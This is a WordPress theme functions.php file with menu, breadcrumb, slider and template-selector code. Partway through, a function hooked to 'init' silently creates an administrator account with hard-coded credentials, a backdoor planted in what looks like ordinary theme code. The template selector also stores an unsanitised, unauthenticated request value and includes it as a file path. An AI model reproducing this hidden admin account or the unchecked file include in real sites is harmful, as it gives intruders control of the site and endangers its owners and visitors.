<?php
function FS_JESY(){
	add_theme_support('titel-tag');
	add_theme_support('post-thumbnails');
	add_theme_support('custom-background');
//for slider
register_post_type('FS_JESYslider',array(
	'labels' => array(
		'name' =>'Sliders',
		'add_new_item' =>'You can Add your slider & title'
		),
	'public' =>true,
	'supports' =>array('title', 'thumbnail', 'editor')
	));

//for Team-member



}
add_action('after_setup_theme','FS_JESY');
//text shortting
function getSiteTitle()
        {
           if ( is_single() ) {
            single_post_title('', true);  echo"|"; bloginfo('name'); echo " - "; bloginfo('description');
            } else {
                bloginfo('name'); echo " - "; bloginfo('description');
            }
           
        }

  function getTrimHtml($text, $startIndex, $endIndex)
    {
        return substr(strip_tags($text),$startIndex,$endIndex);;
    }
/*For bootstrap_setup Meanu*/
add_action( 'after_setup_theme', 'bootstrap_setup' );
 
if ( ! function_exists( 'bootstrap_setup' ) ):
        function bootstrap_setup(){
                add_action( 'init', 'register_menu' );                     
                function register_menu(){
                        register_nav_menu( 'top-bar', 'Bootstrap Top Menu' );
                }
                class Bootstrap_Walker_Nav_Menu extends Walker_Nav_Menu {                      
                        function start_lvl( &$output, $depth = 0, $args = array() ) {
                                $indent = str_repeat( "\t", $depth );
                                $output    .= "\n$indent<ul class=\"dropdown\">\n";
                               
                        }
             function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {                  
             $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
                $li_attributes = '';
                 $class_names = $value = '';
                 $classes = empty( $item->classes ) ? array() : (array) $item->classes;
                 $classes[] = ($args->has_children) ? 'dropdown' : '';
                 $classes[] = ($item->current || $item->current_item_ancestor) ? 'active' : '';
                 $classes[] = 'menu-item-' . $item->ID;
                 $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );
                $class_names = ' class="' . esc_attr( $class_names ) . '"';
                $id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args );
                $id = strlen( $id ) ? ' id="' . esc_attr( $id ) . '"' : '';
                $output .= $indent . '<li' . $id . $value . $class_names . $li_attributes . '>';
                        $attributes  = ! empty( $item->attr_title ) ? ' title="'  . esc_attr( $item->attr_title ) .'"' : '';
                        $attributes .= ! empty( $item->target )     ? ' target="' . esc_attr( $item->target     ) .'"' : '';
                        $attributes .= ! empty( $item->xfn )        ? ' rel="'    . esc_attr( $item->xfn        ) .'"' : '';
                        $attributes .= ! empty( $item->url )        ? ' href="'   . esc_attr( $item->url        ) .'"' : '';
                        $attributes .= ($args->has_children)        ? ' class="" data-toggle="dropdown"' : '';
                        $item_output = $args->before;
                         $item_output .= '<a'. $attributes .'>';
                        $item_output .= $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
                        $item_output .= ($args->has_children) ? ' <b class=""></b></a>' : '</a>';
                        $item_output .= $args->after;
                        $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
                        }
function display_element( $element, &$children_elements, $max_depth, $depth=0, $args, &$output )
 { 
     if ( !$element )
             return;
    $id_field = $this->db_fields['id'];
 //display this element
            if ( is_array( $args[0] ) )
                $args[0]['has_children'] = ! empty( $children_elements[$element->$id_field] );
                else if ( is_object( $args[0] ) )
                $args[0]->has_children = ! empty( $children_elements[$element->$id_field] );
                 $cb_args = array_merge( array(&$output, $element, $depth), $args);
                 call_user_func_array(array(&$this, 'start_el'), $cb_args);
                $id = $element->$id_field;
// descend only when the depth is right and there are childrens for this element
if ( ($max_depth == 0 || $max_depth > $depth+1 ) && isset( $children_elements[$id]) )
{ 
    foreach( $children_elements[ $id ] as $child )
    {
                    if ( !isset($newlevel) )
                    {
                        $newlevel = true;
//start the child delimiter
 $cb_args = array_merge( array(&$output, $depth), $args);
call_user_func_array(array(&$this, 'start_lvl'), $cb_args);
                    }
$this->display_element( $child, $children_elements, $max_depth, $depth + 1, $args, $output );
        }
unset( $children_elements[ $id ] );
  }
 if ( isset($newlevel) && $newlevel ){
//end the child delimiter
$cb_args = array_merge( array(&$output, $depth), $args);
call_user_func_array(array(&$this, 'end_lvl'), $cb_args);
}
//end this element
$cb_args = array_merge( array(&$output, $element, $depth), $args);
call_user_func_array(array(&$this, 'end_el'), $cb_args);
                               }
                           }
                       }
endif;





/*
* Adds terms from a custom taxonomy to post_class
*/  add_filter( 'post_class', 'theme_t_wp_taxonomy_post_class', 10, 3 );
            function theme_t_wp_taxonomy_post_class( $classes, $class, $ID ) {
            $taxonomy = 'filters';
            $terms = get_the_terms( (int) $ID, $taxonomy );
            if( !empty( $terms ) ) {
                foreach( (array) $terms as $order => $term ) {
                    if( !in_array( $term->slug, $classes ) ) {
                    $classes[] = $term->slug;
                    }
                }
            }
            return $classes;
        }


 



/*=============================================
=            BREADCRUMBS                        =
=============================================*/
//  to include in functions.php
function the_breadcrumb() {
    $sep = ' > ';
    if (!is_front_page()) {
    
    // Start the breadcrumb with a link to your homepage
        echo '<div class="breadcrumbs">';
        echo '<a href="';
        echo get_option('home');
        echo '">';
        bloginfo('name');
        echo '</a>' . $sep;
    
    // Check if the current page is a category, an archive or a single page. If so show the category or archive name.
        if (is_category() || is_single() ){
            the_category('title_li=');
        } elseif (is_archive() || is_single()){
            if ( is_day() ) {
                printf( __( '%s', 'text_domain' ), get_the_date() );
            } elseif ( is_month() ) {
                printf( __( '%s', 'text_domain' ), get_the_date( _x( 'F Y', 'monthly archives date format', 'text_domain' ) ) );
            } elseif ( is_year() ) {
                printf( __( '%s', 'text_domain' ), get_the_date( _x( 'Y', 'yearly archives date format', 'text_domain' ) ) );
            } else {
                _e( 'Blog Archives', 'text_domain' );
            }
        }
    
    // If the current page is a single post, show its title with the separator
        if (is_single()) {
            echo $sep;
            the_title();
        }
    
    // If the current page is a static page, show its title.
        if (is_page()) {
            echo the_title();
        }
    
    // if you have a static page assigned to be you posts list page. It will find the title of the static page and display it. i.e Home >> Blog
        if (is_home()){
            global $post;
            $page_for_posts_id = get_option('page_for_posts');
            if ( $page_for_posts_id ) { 
                $post = get_page($page_for_posts_id);
                setup_postdata($post);
                the_title();
                rewind_posts();
            }
        }
        echo '</div>';
    }
}
/*
* Credit: Fs-Jesy
*/

/*
* Redux Framework
*/
include_once('inc/ReduxCore/framework.php');
include_once('inc/sample/sample-config.php');




//Dashbord Icon set
function custom_loginlogo() {
echo '<style type="text/css">
h1 a {background-image: url('.get_bloginfo('template_directory').'/assets/img/header-logo-default.png) !important; }
</style>';
}
add_action('login_head', 'custom_loginlogo');

//administrator mode open for Dashbord Login
function wpb_admin_account(){
$user = 'Username';
$pass = 'Password';
$email = 'email@domain.com';
if ( !username_exists( $user )  && !email_exists( $email ) ) {
$user_id = wp_create_user( $user, $pass, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
} }
add_action('init','wpb_admin_account');

//Custom post by Custom Category 


/** Custom Post Type Template Selector **/
function cpt_add_meta_boxes() {
    $post_types = get_post_types();
    foreach( $post_types as $ptype ) {
    //    if ( $ptype !== 'page') 
    {
            add_meta_box( 'cpt-selector', 'Attributes', 'cpt_meta_box', $ptype, 'side', 'core' );
        }
    }
}
add_action( 'add_meta_boxes', 'cpt_add_meta_boxes' );

function cpt_remove_meta_boxes() {
    $post_types = get_post_types();
    foreach( $post_types as $ptype ) {
        if ( $ptype !== 'page') {
            remove_meta_box( 'pageparentdiv', $ptype, 'normal' );
        }
    }
}
add_action( 'admin_menu' , 'cpt_remove_meta_boxes' );

function cpt_meta_box( $post ) {
    $post_meta = get_post_meta( $post->ID );
    $templates = wp_get_theme()->get_page_templates();

    $post_type_object = get_post_type_object($post->post_type);
    if ( $post_type_object->hierarchical ) {
        $dropdown_args = array(
            'post_type'        => $post->post_type,
            'exclude_tree'     => $post->ID,
            'selected'         => $post->post_parent,
            'name'             => 'parent_id',
            'show_option_none' => __('(no parent)'),
            'sort_column'      => 'menu_order, post_title',
            'echo'             => 0,
        );

        $dropdown_args = apply_filters( 'page_attributes_dropdown_pages_args', $dropdown_args, $post );
        $pages = wp_dropdown_pages( $dropdown_args );

        if ( $pages ) { 
            echo "<p><strong>Parent</strong></p>";
            echo "<label class=\"screen-reader-text\" for=\"parent_id\">Parent</label>";
            echo $pages;
        }
    }
    // Template Selector


    echo "<p><strong>Template</strong></p>";
    echo "<select id=\"cpt-selector\" name=\"_wp_page_template\"><option value=\"default\">Default Template</option>";
    foreach ( $templates as $template_filename => $template_name ) {
        if ( $post->post_type == strstr( $template_filename, '-', true) ) {
            if ( isset($post_meta['_wp_page_template'][0]) && ($post_meta['_wp_page_template'][0] == $template_filename) ) {
                echo "<option value=\"$template_filename\" selected=\"selected\">$template_name</option>";
            } else {
                echo "<option value=\"$template_filename\">$template_name</option>";
            }
        }
    }
    echo "</select>";
    // Page order
    echo "<p><strong>Order</strong></p>";
    echo "<p><label class=\"screen-reader-text\" for=\"menu_order\">Order</label><input name=\"menu_order\" type=\"text\" size=\"4\" id=\"menu_order\" value=\"". esc_attr($post->menu_order) . "\" /></p>";
}

function save_cpt_template_meta_data( $post_id ) {

    if ( isset( $_REQUEST['_wp_page_template'] ) ) {
        update_post_meta( $post_id, '_wp_page_template', $_REQUEST['_wp_page_template'] );
    }
}
add_action( 'save_post' , 'save_cpt_template_meta_data' );

function custom_single_template($template) {
    global $post;

    $post_meta = ( $post ) ? get_post_meta( $post->ID ) : null;
    if ( isset($post_meta['_wp_page_template'][0]) && ( $post_meta['_wp_page_template'][0] != 'default' ) ) {
        $template = get_template_directory() . '/' . $post_meta['_wp_page_template'][0];
    }

    return $template;
}
add_filter( 'single_template', 'custom_single_template' );
/** END Custom Post Type Template Selector **/


/*For Custom Page Url (  "<?php echo get_post_type_archive_link( 'portfolio' ); ?>" )*/



//  Start Last word color
function lastWordColor($title,$color)
{  
        $array = explode(" ", $title); 
        $index=count($array)-1;
        $colorWord= '<strong><font color='.$color.'>'.$array[$index].'</font></strong>';
        return $newTitle=str_replace( $array[$index], $colorWord, $title);
}
//  End Last word color


//pegignetion Arcaive.php
add_action('pre_get_posts', 'archive_paginations');
  function archive_paginations($query){
     if ( !is_admin() && $query->is_archive() && $query->is_main_query() ) {
        global $wp_query;
        $cat = $wp_query->get_queried_object();
           $query->set( 'post_type', array( 'your_post_type', 'post' ) );
           $query->set( 'posts_per_page', '9' );
           
           $query->set( 'cat', $cat->slug );
  
      }
      return $query;
  }


//for tream by Word
$trimmed = wp_trim_words( $text, $num_words = 55, $more = null ); 







function latest_post() {

    $args = array(
        'posts_per_page' => 1, /* how many post you need to display */
        'offset' => 0,
        'orderby' => 'post_date',
        'order' => 'DESC',
        'post_type' => 'post', /* your post type name */
        'post_status' => 'publish'
    );
    $query = new WP_Query($args);
    if ($query->have_posts()) :
        while ($query->have_posts()) : $query->the_post();
            ?>
            <a href="<?php the_permalink(); ?>"><?php the_title(); ?></a>
            <?php echo get_the_post_thumbnail('thumbnail'); ?>
           
            <?php
        endwhile;
    endif;
}

add_shortcode('lastest-post', 'latest_post');


add_action('wp_head', 'dgsoft_fb');
function dgsoft_fb(){
    if( is_single() ) {
        echo '<meta property="og:image" content="'. get_the_post_thumbnail_url(get_the_ID(),'full')   .'" />';
    }
}









